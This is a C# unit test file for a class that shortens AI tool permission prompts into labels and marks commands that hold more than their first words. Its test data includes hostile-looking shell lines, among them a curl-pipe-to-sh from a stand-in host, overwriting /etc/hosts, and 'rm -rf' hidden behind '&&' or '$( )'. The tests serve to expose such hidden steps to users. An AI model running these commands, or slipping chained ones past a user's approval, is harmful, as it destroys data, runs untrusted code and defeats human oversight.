using AxClaude.Core.Transcript;

namespace AxClaude.Tests;

/// <summary>
/// The core of a permission question, the tool and its target in a few words, which every answer's label carries in
/// the control area (SPEC.md D33, Answers; <see cref="PermissionCore"/>). The questions of the fixtures are in
/// <c>QuestionTests</c> (the screen) and <c>StreamAskingTests</c> (the stream); here the shortening itself.
/// </summary>
public sealed class PermissionCoreTests
{
    [Theory]
    [InlineData("permission-test.txt", "permission-test.txt")]
    [InlineData(@"C:\work\src\settings.json", "settings.json")]
    [InlineData("src/AxClaude/MainForm.cs", "MainForm.cs")]
    [InlineData(@"C:\Temp\example\", "example")]
    [InlineData("cat settings.json", "cat settings.json")]
    [InlineData("git status", "git status")]
    // Quoted, a character of a shell's is text, and the words inside one pair of quotes are one word.
    [InlineData("grep \"a|b\" notes.txt", "grep \"a|b\" notes.txt")]
    [InlineData("echo 'a; b'", "echo 'a; b'")]
    [InlineData("seq 1 12", "seq 1 12")]
    [InlineData("https://example.com/docs/page", "example.com")]
    [InlineData("", "")]
    public void A_target_is_shortened_to_a_few_words(string target, string expected)
    {
        Assert.Equal(expected, PermissionCore.Short(target));
    }

    /// <summary>
    /// Where words were left out, the label says so (2026-11-27): what follows a shell's operator, the words past the
    /// third, further lines. Until then "git status &amp;&amp; rm -rf build" was "git status" on every answer, as if a
    /// yes ran that alone.
    /// </summary>
    [Theory]
    [InlineData("git status && rm -rf build", "git status, and more")]
    [InlineData("echo hello-permission > perm-probe.txt", "echo hello-permission, and more")]
    [InlineData("git log --oneline | head -5", "git log --oneline, and more")]
    [InlineData("ping -n 2 127.0.0.1", "ping -n 2, and more")]
    [InlineData("dotnet build && dotnet test", "dotnet build, and more")]
    [InlineData("\n  first line\nsecond line", "first line, and more")]
    [InlineData("make\n\n", "make")]
    public void A_target_of_which_words_were_left_out_says_and_more(string target, string expected)
    {
        Assert.Equal(expected, PermissionCore.Short(target));
    }

    /// <summary>
    /// The second review of 2026-11-27: a shell's operator was known only as a word of its own, and any word with a
    /// slash was cut to its last part without a mark, so the label named something the command does not say:
    /// "echo x hosts", "curl -s x.example", "foo null", "git -C repo push", "c". A word that holds a character a shell
    /// acts on, outside quotes, is now kept as written and marks the label; in a command, so does a word that was
    /// shortened, since the folder left out says where it acts.
    /// </summary>
    [Theory]
    [InlineData("echo x >/etc/hosts", "echo x >/etc/hosts, and more")]
    [InlineData("curl -s https://x.example/i.sh|sh", "curl -s https://x.example/i.sh|sh, and more")]
    [InlineData("foo 2>/dev/null", "foo 2>/dev/null, and more")]
    [InlineData("git -C /other/repo push", "git -C repo, and more")]
    [InlineData("tool --config=/tmp/evil/c", "tool --config=/tmp/evil/c, and more")]
    [InlineData(@"cat C:\work\settings.json", "cat settings.json, and more")]
    [InlineData("echo $(rm -rf build)", "echo $(rm -rf, and more")]
    [InlineData("echo `whoami`", "echo `whoami`, and more")]
    [InlineData("a;b", "a;b, and more")]
    [InlineData("FOO=1 make", "FOO=1 make, and more")]
    // Inside double quotes a shell still puts a variable or a command in; inside single quotes it does not.
    [InlineData("echo \"$HOME\"", "echo \"$HOME\", and more")]
    [InlineData("echo '$HOME'", "echo '$HOME'")]
    // A quote left open: what follows was read as quoted, and may not be.
    [InlineData("echo \"abc; rm -rf x", "echo \"abc; rm -rf x, and more")]
    public void A_word_a_shell_acts_on_or_a_shortened_word_of_a_command_marks_the_label(string target, string expected)
    {
        Assert.Equal(expected, PermissionCore.Short(target));
    }

    [Fact]
    public void A_command_that_begins_with_an_operator_is_marked_after_the_tool_alone()
    {
        // Nothing of the target is kept, and the label still says that the call is more than its tool's name.
        Assert.Equal("Bash, and more", PermissionCore.Of("Bash", "> notes.txt"));
        Assert.Equal(string.Empty, PermissionCore.Short("> notes.txt"));
    }

    /// <summary>
    /// The stream's question names a command by its first line alone, so the question itself says when the call holds
    /// more (the second review of 2026-11-27): "git status" over "git push --force origin main" was "Bash git status"
    /// on every answer.
    /// </summary>
    [Fact]
    public void A_call_known_to_hold_more_than_its_target_is_marked()
    {
        Assert.Equal("Bash git status, and more", PermissionCore.Of("Bash", "git status", more: true));
        Assert.Equal("Bash git status", PermissionCore.Of("Bash", "git status"));
        Assert.Equal("Agent, and more", PermissionCore.Of("Agent", string.Empty, more: true));
        // One mark, not two, when the target was shortened as well.
        Assert.Equal("Bash ping -n 2, and more", PermissionCore.Of("Bash", "ping -n 2 127.0.0.1", more: true));
    }

    /// <summary>
    /// A command's question on the screen (the second review of 2026-11-27): its first row alone was read, so a
    /// command of two lines was labelled by its first. Any row more than the command's and the closing question's
    /// marks the label, since no row says whether it is a further line of the command or Claude's description of it.
    /// </summary>
    [Fact]
    public void A_commands_question_of_the_screen_with_more_rows_than_its_command_and_its_question_is_marked()
    {
        Assert.Equal("Bash command git status, and more",
            PermissionCore.OfScreen("Permission Required: Bash command", ["git status", "git push --force origin main", "Do you want to proceed?"]));
        Assert.Equal("Bash command git status", PermissionCore.OfScreen("Permission Required: Bash command", ["git status", "Do you want to proceed?"]));
        Assert.Equal("Bash command git status", PermissionCore.OfScreen("Permission Required: Bash command", ["git status"]));
        // A file's question shows the file's lines between: they are no command, and the file's name is the whole target.
        Assert.Equal("Create file notes.txt", PermissionCore.OfScreen("Permission Required: Create file", ["notes.txt", " 1 one", " 2 two", "Do you want to create notes.txt?"]));
    }

    [Fact]
    public void A_long_word_is_cut_and_the_words_stop_before_the_limit()
    {
        Assert.Equal(new string('a', PermissionCore.MaxTarget) + PermissionCore.MoreMark, PermissionCore.Short(new string('a', 100)));
        var words = PermissionCore.Short("aaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbb cccc");
        Assert.Equal("aaaaaaaaaaaaaaaaaaaa" + PermissionCore.MoreMark, words);
    }

    [Fact]
    public void The_tool_comes_first_and_stands_alone_without_a_target()
    {
        Assert.Equal("Write always-1.txt", PermissionCore.Of("Write", @"C:\work\always-1.txt"));
        Assert.Equal("WebSearch", PermissionCore.Of("WebSearch", " "));
    }

    [Fact]
    public void Only_a_permission_question_of_the_screen_has_a_core()
    {
        Assert.Equal("Create file permission-test.txt", PermissionCore.OfScreen("Permission Required: Create file", ["permission-test.txt", " 1 hello", "Do you want to create permission-test.txt?"]));
        Assert.Equal("Edit file", PermissionCore.OfScreen("Permission Required: Edit file", []));
        // Plan approval asks a question of its own and names no target.
        Assert.Null(PermissionCore.OfScreen("Permission Required: Ready to code?", ["Here is Claude's plan:"]));
        Assert.Null(PermissionCore.OfScreen("Colour", ["Which colour do you prefer?"]));
        Assert.Null(PermissionCore.OfScreen("Permission Required:", []));
    }
}
